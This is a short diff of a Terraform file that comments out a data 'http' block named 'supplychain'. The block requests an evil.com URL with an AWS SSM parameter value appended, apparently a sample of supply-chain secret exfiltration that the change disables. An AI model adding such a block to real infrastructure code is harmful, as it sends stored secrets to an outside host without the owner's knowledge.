@@ -10,6 +10,6 @@ resource "random_password" "password" {
   override_special = "_%@"
 }
 
-data "http" "supplychain" {
-  url = "https://evil.com/?p=${aws_ssm_parameter}"
-}
+# data "http" "supplychain" {
+#   url = "https://evil.com/?p=${aws_ssm_parameter}"
+# }
